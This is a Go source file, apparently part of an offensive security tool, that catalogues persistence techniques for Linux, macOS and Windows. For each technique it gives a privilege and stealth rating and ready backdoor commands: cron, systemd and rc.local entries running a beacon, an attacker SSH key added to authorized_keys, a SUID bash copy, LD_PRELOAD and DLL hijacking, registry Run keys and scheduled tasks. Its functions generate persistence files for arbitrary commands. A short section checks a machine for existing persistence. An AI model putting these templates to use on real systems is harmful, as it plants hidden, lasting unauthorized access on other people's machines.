package persist

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

// PersistenceMethod represents a persistence technique
type PersistenceMethod string

const (
	MethodCron      PersistenceMethod = "cron"
	MethodSystemd   PersistenceMethod = "systemd"
	MethodRCLocal   PersistenceMethod = "rc.local"
	MethodBashRC    PersistenceMethod = "bashrc"
	MethodProfile   PersistenceMethod = "profile"
	MethodSSHKeys   PersistenceMethod = "ssh-keys"
	MethodLaunchd   PersistenceMethod = "launchd"
	MethodScheduled PersistenceMethod = "scheduled"
	MethodRegistry  PersistenceMethod = "registry"
	MethodStartup   PersistenceMethod = "startup"
)

// TechniqueInfo holds information about a persistence technique
type TechniqueInfo struct {
	Name        string
	Description string
	OS          string
	Privilege   string // "user", "root/admin"
	Stealth     string // "low", "medium", "high"
	Syntax      string
	Example     string
}

// LinuxTechniques contains Linux persistence techniques
var LinuxTechniques = []TechniqueInfo{
	{
		Name:        "Cron Job",
		Description: "Schedule command execution via cron",
		OS:          "Linux",
		Privilege:   "user/root",
		Stealth:     "medium",
		Syntax:      "crontab -e  OR  echo '* * * * * <command>' >> /etc/crontab",
		Example:     "* * * * * /tmp/beacon.sh",
	},
	{
		Name:        "Systemd Service",
		Description: "Create a systemd service unit",
		OS:          "Linux",
		Privilege:   "root",
		Stealth:     "low",
		Syntax:      "/etc/systemd/system/<name>.service",
		Example:     "[Unit]\nDescription=Backdoor\n[Service]\nExecStart=/tmp/beacon\nRestart=always\n[Install]\nWantedBy=multi-user.target",
	},
	{
		Name:        "rc.local",
		Description: "Execute on system boot via rc.local",
		OS:          "Linux",
		Privilege:   "root",
		Stealth:     "medium",
		Syntax:      "echo '<command>' >> /etc/rc.local",
		Example:     "/tmp/beacon.sh &",
	},
	{
		Name:        ".bashrc",
		Description: "Execute on user shell start",
		OS:          "Linux",
		Privilege:   "user",
		Stealth:     "high",
		Syntax:      "echo '<command>' >> ~/.bashrc",
		Example:     "/tmp/beacon.sh &",
	},
	{
		Name:        "/etc/profile.d/",
		Description: "Execute for all users on login",
		OS:          "Linux",
		Privilege:   "root",
		Stealth:     "medium",
		Syntax:      "echo '<command>' > /etc/profile.d/backdoor.sh",
		Example:     "#!/bin/bash\n/tmp/beacon.sh &",
	},
	{
		Name:        "SSH Authorized Keys",
		Description: "Add SSH public key for persistent access",
		OS:          "Linux",
		Privilege:   "user",
		Stealth:     "high",
		Syntax:      "echo '<pubkey>' >> ~/.ssh/authorized_keys",
		Example:     "ssh-rsa AAAA... attacker@kali",
	},
	{
		Name:        "LD_PRELOAD",
		Description: "Hijack library loading",
		OS:          "Linux",
		Privilege:   "root",
		Stealth:     "low",
		Syntax:      "echo '/path/to/evil.so' >> /etc/ld.so.preload",
		Example:     "/tmp/evil.so",
	},
	{
		Name:        "SUID Binary",
		Description: "Create SUID binary for privilege escalation",
		OS:          "Linux",
		Privilege:   "root",
		Stealth:     "low",
		Syntax:      "cp /bin/bash /tmp/backdoor && chmod u+s /tmp/backdoor",
		Example:     "/tmp/backdoor -p",
	},
}

// MacOSTechniques contains macOS persistence techniques
var MacOSTechniques = []TechniqueInfo{
	{
		Name:        "Launch Agent (User)",
		Description: "User-level persistence via LaunchAgent",
		OS:          "macOS",
		Privilege:   "user",
		Stealth:     "medium",
		Syntax:      "~/Library/LaunchAgents/<name>.plist",
		Example:     "<?xml version=\"1.0\"?>\n<plist version=\"1.0\">\n<dict>\n  <key>Label</key>\n  <string>com.backdoor</string>\n  <key>ProgramArguments</key>\n  <array><string>/tmp/beacon</string></array>\n  <key>RunAtLoad</key>\n  <true/>\n</dict>\n</plist>",
	},
	{
		Name:        "Launch Daemon",
		Description: "System-level persistence via LaunchDaemon",
		OS:          "macOS",
		Privilege:   "root",
		Stealth:     "low",
		Syntax:      "/Library/LaunchDaemons/<name>.plist",
		Example:     "Same as LaunchAgent but in /Library/LaunchDaemons/",
	},
	{
		Name:        "Login Items",
		Description: "Add application to login items",
		OS:          "macOS",
		Privilege:   "user",
		Stealth:     "high",
		Syntax:      "osascript -e 'tell application \"System Events\" to make login item'",
		Example:     "osascript -e 'tell app \"System Events\" to make login item at end with properties {path:\"/tmp/beacon\", hidden:true}'",
	},
	{
		Name:        "Cron",
		Description: "Schedule via cron (same as Linux)",
		OS:          "macOS",
		Privilege:   "user",
		Stealth:     "medium",
		Syntax:      "crontab -e",
		Example:     "* * * * * /tmp/beacon.sh",
	},
}

// WindowsTechniques contains Windows persistence techniques
var WindowsTechniques = []TechniqueInfo{
	{
		Name:        "Registry Run Key",
		Description: "Execute on user login via registry",
		OS:          "Windows",
		Privilege:   "user/admin",
		Stealth:     "low",
		Syntax:      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		Example:     "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\beacon.exe",
	},
	{
		Name:        "Scheduled Task",
		Description: "Windows Task Scheduler persistence",
		OS:          "Windows",
		Privilege:   "admin",
		Stealth:     "medium",
		Syntax:      "schtasks /create /tn \"Name\" /tr \"command\" /sc onlogon",
		Example:     "schtasks /create /tn \"Updater\" /tr \"C:\\beacon.exe\" /sc onlogon /ru SYSTEM",
	},
	{
		Name:        "Startup Folder",
		Description: "Place executable in startup folder",
		OS:          "Windows",
		Privilege:   "user",
		Stealth:     "low",
		Syntax:      "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
		Example:     "copy beacon.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"",
	},
	{
		Name:        "WMI Event Subscription",
		Description: "Persistent WMI event consumer",
		OS:          "Windows",
		Privilege:   "admin",
		Stealth:     "high",
		Syntax:      "WMI EventConsumer + EventFilter + FilterToConsumerBinding",
		Example:     "# Requires PowerShell script for setup",
	},
	{
		Name:        "Services",
		Description: "Create Windows service",
		OS:          "Windows",
		Privilege:   "admin",
		Stealth:     "low",
		Syntax:      "sc create <name> binPath= <path>",
		Example:     "sc create Backdoor binPath= C:\\beacon.exe start= auto",
	},
	{
		Name:        "DLL Hijacking",
		Description: "Place malicious DLL in search path",
		OS:          "Windows",
		Privilege:   "varies",
		Stealth:     "medium",
		Syntax:      "Copy DLL to application directory",
		Example:     "copy evil.dll C:\\Program Files\\App\\version.dll",
	},
}

// ListTechniques lists available persistence techniques for the current OS
func ListTechniques() []TechniqueInfo {
	var techniques []TechniqueInfo

	switch runtime.GOOS {
	case "linux":
		techniques = LinuxTechniques
	case "darwin":
		techniques = MacOSTechniques
	case "windows":
		techniques = WindowsTechniques
	default:
		techniques = LinuxTechniques // Default to Linux
	}

	return techniques
}

// ListAllTechniques lists all techniques for all operating systems
func ListAllTechniques() map[string][]TechniqueInfo {
	return map[string][]TechniqueInfo{
		"linux":   LinuxTechniques,
		"darwin":  MacOSTechniques,
		"windows": WindowsTechniques,
	}
}

// GenerateCronPersistence generates cron persistence
func GenerateCronPersistence(command, schedule string) string {
	if schedule == "" {
		schedule = "* * * * *" // Every minute
	}
	return fmt.Sprintf("%s %s", schedule, command)
}

// GenerateSystemdService generates a systemd service file
func GenerateSystemdService(name, command, description string) string {
	if description == "" {
		description = "System Service"
	}

	return fmt.Sprintf(`[Unit]
Description=%s
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
`, description, command)
}

// GenerateLaunchdPlist generates a macOS launchd plist
func GenerateLaunchdPlist(label, command string, runAtLoad bool) string {
	runAtLoadStr := "false"
	if runAtLoad {
		runAtLoadStr = "true"
	}

	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <%s/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
`, label, command, runAtLoadStr)
}

// CheckExistingPersistence checks for common persistence mechanisms
func CheckExistingPersistence() []string {
	var findings []string

	switch runtime.GOOS {
	case "linux":
		findings = append(findings, checkLinuxPersistence()...)
	case "darwin":
		findings = append(findings, checkMacOSPersistence()...)
	}

	return findings
}

func checkLinuxPersistence() []string {
	var findings []string

	// Check crontabs
	if out, err := exec.Command("crontab", "-l").Output(); err == nil {
		if len(out) > 0 {
			findings = append(findings, "User crontab has entries")
		}
	}

	// Check systemd services
	if _, err := os.Stat("/etc/systemd/system"); err == nil {
		files, _ := os.ReadDir("/etc/systemd/system")
		for _, f := range files {
			if strings.HasSuffix(f.Name(), ".service") && !strings.HasPrefix(f.Name(), "system") {
				findings = append(findings, fmt.Sprintf("Custom systemd service: %s", f.Name()))
			}
		}
	}

	// Check rc.local
	if data, err := os.ReadFile("/etc/rc.local"); err == nil {
		if len(data) > 50 {
			findings = append(findings, "/etc/rc.local has content")
		}
	}

	return findings
}

func checkMacOSPersistence() []string {
	var findings []string

	// Check LaunchAgents
	homeDir, _ := os.UserHomeDir()
	launchAgentDir := homeDir + "/Library/LaunchAgents"
	if files, err := os.ReadDir(launchAgentDir); err == nil {
		for _, f := range files {
			if strings.HasSuffix(f.Name(), ".plist") {
				findings = append(findings, fmt.Sprintf("User LaunchAgent: %s", f.Name()))
			}
		}
	}

	// Check system LaunchDaemons
	if files, err := os.ReadDir("/Library/LaunchDaemons"); err == nil {
		for _, f := range files {
			if strings.HasSuffix(f.Name(), ".plist") && !strings.HasPrefix(f.Name(), "com.apple") {
				findings = append(findings, fmt.Sprintf("System LaunchDaemon: %s", f.Name()))
			}
		}
	}

	return findings
}

// DisplayTechniques displays persistence techniques
func DisplayTechniques(techniques []TechniqueInfo, detailed bool) {
	fmt.Println("\n[PERSISTENCE TECHNIQUES]")
	fmt.Println(strings.Repeat("=", 60))

	for i, tech := range techniques {
		fmt.Printf("\n%d. %s [%s] [%s]\n", i+1, tech.Name, tech.Privilege, tech.Stealth)
		fmt.Printf("   OS: %s\n", tech.OS)
		fmt.Printf("   %s\n", tech.Description)

		if detailed {
			fmt.Printf("\n   Syntax:\n   %s\n", tech.Syntax)
			fmt.Printf("\n   Example:\n   %s\n", tech.Example)
		}
	}

	fmt.Println()
}

// DisplayExistingPersistence displays existing persistence findings
func DisplayExistingPersistence(findings []string) {
	fmt.Println("\n[EXISTING PERSISTENCE]")
	fmt.Println(strings.Repeat("=", 60))

	if len(findings) == 0 {
		fmt.Println("No obvious persistence mechanisms found")
		return
	}

	for _, finding := range findings {
		fmt.Printf("  [!] %s\n", finding)
	}

	fmt.Println()
}
